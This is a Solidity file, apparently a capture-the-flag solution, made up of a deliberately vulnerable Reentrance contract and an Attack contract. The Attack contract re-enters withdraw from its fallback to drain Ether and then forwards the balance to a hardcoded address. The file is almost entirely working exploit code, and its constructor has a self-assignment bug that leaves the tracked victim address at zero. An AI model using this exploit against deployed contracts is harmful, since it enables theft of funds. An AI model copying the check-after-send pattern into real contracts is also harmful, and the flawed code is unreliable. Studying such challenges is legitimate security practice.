// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Reentrance {
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to] + msg.value;
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract Attack {
    event balance(uint indexed balance);
    event withdraw(string indexed info);
    Reentrance public reentrancy;
    address public reentrancyAddr;

    constructor(address _reentrancy) {
        reentrancy = Reentrance(payable(_reentrancy));
        reentrancyAddr = payable(reentrancyAddr);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        emit balance(reentrancyAddr.balance);
        if (reentrancyAddr.balance >= 0.000446 ether) {
            reentrancy.withdraw(0.000446 ether);
            emit withdraw("fallback");
        }
    }

    function prepAttack(address payable donateAddress) external payable {
        require(msg.value == 0.000446 ether);
        reentrancy.donate{value: msg.value}(donateAddress);
    }

    function attack() public {
        reentrancy.withdraw(0.000446 ether);
    }

    function sendETH() public {
        (bool success, ) = 0x684585A4E1F28D83F7404F0ec785758C100a3509.call{
            value: address(this).balance
        }("");
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function getReenBal() public view returns (uint) {
        return reentrancyAddr.balance;
    }
}
